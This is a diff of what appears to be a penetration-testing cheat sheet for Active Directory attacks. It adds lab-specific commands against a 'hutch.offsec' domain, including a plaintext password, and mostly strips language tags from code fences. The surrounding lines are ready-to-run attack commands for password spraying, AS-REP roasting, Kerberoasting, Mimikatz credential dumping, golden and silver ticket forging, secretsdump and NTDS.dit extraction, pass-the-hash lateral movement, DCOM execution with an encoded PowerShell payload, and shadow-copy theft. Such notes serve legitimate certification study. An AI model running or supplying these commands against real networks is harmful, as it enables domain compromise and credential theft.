@@ -813,8 +813,8 @@ dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
 gobuster dir -u http://example.com -w /path/to/wordlist.txt -t 40 -q
 gobuster dir -u http://example.com -w /path/to/wordlist.txt -x php,html,txt,sh,py,rb # for certain file types
-gobuster dns -d http://example.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt # to enumerate DNS subdomains
-gobuster vhost -u http://example.com -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt # for Vhost subdomain enumeration, then add any to the hosts file
+gobuster dns -d http://example.com -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt # to enumerate DNS subdomains
+gobuster vhost -u http://example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt # for Vhost subdomain enumeration, then add any to the hosts file
 
 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.permx.htb/ -mc 200 -s # subdomains, filter by -fs (size) if all 200
@@ -923,6 +923,7 @@ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --a
 ## LDAP Enumeration
 
 ```powershell
+ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass=*)"
 ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -1837,14 +1838,14 @@ grep -inr "cpassword"
 
 - Crackmapexec
 
-```bash
+```
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
 ```
 
 - Decrypting the CPassword
 
-```bash
+```
 gpp-decrypt "cpassword"
 ```
 
@@ -1862,17 +1863,22 @@ gpp-decrypt "cpassword"
 
 ### Password Spraying
 
-```powershell
+```
 # Crackmapexec - check if the output shows 'Pwned!'
 crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
+# check for password re-use
+crackmapexec smb 192.168.227.122 -u /home/kali/users.txt 'CrabSharkJellyfish192' -d hutch.offsec
+
 
 # Kerbrute
+kerbrute userenum -d hutch.offsec --dc 192.168.188.122 users
+./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 192.168.227.122 /home/kali/users.txt
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
 
 ### AS-REP Roasting
 
-```powershell
+```
 impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
 .\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
 
@@ -1881,7 +1887,7 @@ hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 
 ### Kerberoasting
 
-```powershell
+```
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
 
 impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
@@ -1893,21 +1899,21 @@ hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
 
 - Obtaining hash of an SPN user using **Mimikatz**
 
-```powershell
+```
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ```
 
 - Obtaining Domain SID
 
-```powershell
+```
 ps> whoami /user
 # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
 ```
 
 - Forging silver ticket Ft **Mimikatz**
 
-```powershell
+```
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
 exit
 
@@ -1917,13 +1923,13 @@ ps> klist
 
 - Accessing service
 
-```powershell
+```
 ps> iwr -UseDefaultCredentials <servicename>://<computername>
 ```
 
 ### Secretsdump
 
-```powershell
+```
 secretsdump.py <domain>/<user>:<password>@<IP>
 secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
 secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
@@ -1931,7 +1937,7 @@ secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
 
 ### Dumping NTDS.dit
 
-```bash
+```
 secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 #use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
 ```
@@ -1945,7 +1951,7 @@ secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 > *Always pass the full hash to these tools!*
 > 
 
-```powershell
+```
 psexec.py <domain>/<user>:<password1>@<IP>
 # the user should have write access to Admin share then only we can get sesssion
 
@@ -1968,7 +1974,7 @@ atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68a
 
 ### winrs
 
-```powershell
+```
 winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
 # run this on windows session
@@ -1978,7 +1984,7 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 
 - If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
 
-```powershell
+```
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
@@ -2009,14 +2015,14 @@ crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privile
 
 - Crackmapexec database
 
-```bash
+```
 cmedb #to launch the console
 help #run this command to view some others, running individual commands give infor on all the data till now we did.
 ```
 
 ### Pass the ticket
 
-```powershell
+```
 .\mimikatz.exe
 sekurlsa::tickets /export
 kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -2026,7 +2032,7 @@ dir \\<RHOST>\admin$
 
 ### DCOM
 
-```powershell
+```
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
@@ -2039,7 +2045,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 
 1. Get the krbtgt hash
 
-```powershell
+```
 .\mimikatz.exe
 privilege::debug
 #below are some ways
@@ -2057,7 +2063,7 @@ kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698
 
 1. Obtaining access!
 
-```powershell
+```
 mimikatz.exe #no need for highest privileges
 kerberos::ptt golden
 misc::cmd #we're accessing cmd
@@ -2065,7 +2071,7 @@ misc::cmd #we're accessing cmd
 
 ### Shadow Copies
 
-```powershell
+```
 vshadow.exe -nw -p C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 reg.exe save hklm\system c:\system.bak
